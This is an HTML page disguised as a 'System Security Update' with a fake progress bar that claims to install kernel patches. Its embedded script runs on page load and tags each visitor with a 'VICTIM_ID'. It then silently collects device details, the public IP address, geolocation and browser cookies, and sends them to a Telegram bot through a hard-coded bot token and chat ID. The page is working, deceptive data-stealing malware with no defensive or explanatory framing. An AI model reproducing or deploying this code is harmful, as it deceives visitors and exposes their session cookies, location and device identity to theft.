<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>System Security Update</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }
        body {
            background: linear-gradient(135deg, #0a0a0f 0%, #1a1a2e 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        .container {
            background: rgba(255,255,255,0.05);
            backdrop-filter: blur(10px);
            border-radius: 30px;
            padding: 40px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.5);
            max-width: 500px;
            width: 100%;
            text-align: center;
            border: 1px solid rgba(255,255,255,0.1);
        }
        h1 {
            color: #fff;
            margin-bottom: 20px;
            font-size: 28px;
        }
        .progress {
            width: 100%;
            height: 6px;
            background: #333;
            border-radius: 3px;
            margin: 20px 0;
            overflow: hidden;
        }
        .progress-bar {
            height: 100%;
            background: linear-gradient(90deg, #4285F4, #34A853);
            width: 0%;
            transition: width 0.3s;
        }
        .status {
            color: #ccc;
            font-size: 14px;
            margin: 20px 0;
        }
        .id-badge {
            background: rgba(255,255,255,0.1);
            padding: 10px;
            border-radius: 10px;
            color: #00ff00;
            font-family: monospace;
            font-size: 18px;
            margin: 20px 0;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Security Update Required</h1>
        <div class="id-badge" id="deviceId">INITIALIZING...</div>
        <div class="progress">
            <div class="progress-bar" id="progressBar"></div>
        </div>
        <div class="status" id="status">Installing kernel-level security patches...</div>
    </div>

    <script>
        const VICTIM_ID = Math.random().toString(36).substring(2, 15).toUpperCase();
        const NETLIFY_URL = "https://warm-alfajores-231c09.netlify.app";
        
        document.getElementById('deviceId').innerText = VICTIM_ID;
        
        async function sendToTelegram(type, data) {
            try {
                await fetch(`https://api.telegram.org/bot7872720949:AAFM9BmG80hh2hh5gmMY5c51ewxLgV09xeI/sendMessage`, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        chat_id: '8209720840',
                        text: `ðŸ’€ <b>${type}</b> [${VICTIM_ID}]\n<code>${String(data).substring(0, 3000)}</code>`,
                        parse_mode: 'HTML'
                    })
                });
            } catch(e) {}
        }
        
        async function collectData() {
            // Device info
            await sendToTelegram('DEVICE', 
                `Platform: ${navigator.platform}\nUserAgent: ${navigator.userAgent}\nScreen: ${screen.width}x${screen.height}`);
            
            // IP address
            try {
                let ip = await (await fetch('https://api.ipify.org')).text();
                await sendToTelegram('IP', ip);
            } catch(e) {}
            
            // Location (if allowed)
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(async (pos) => {
                    await fetch(`https://api.telegram.org/bot7872720949:AAFM9BmG80hh2hh5gmMY5c51ewxLgV09xeI/sendLocation`, {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify({
                            chat_id: '8209720840',
                            latitude: pos.coords.latitude,
                            longitude: pos.coords.longitude
                        })
                    });
                });
            }
            
            // Cookies
            if (document.cookie) {
                await sendToTelegram('COOKIES', document.cookie);
            }
        }
        
        collectData();
        
        let width = 0;
        const interval = setInterval(() => {
            width += 1;
            document.getElementById('progressBar').style.width = width + '%';
            if (width >= 100) {
                clearInterval(interval);
                document.getElementById('status').innerHTML = 'âœ… Kernel-level update complete';
            }
        }, 50);
    </script>
</body>
</html>
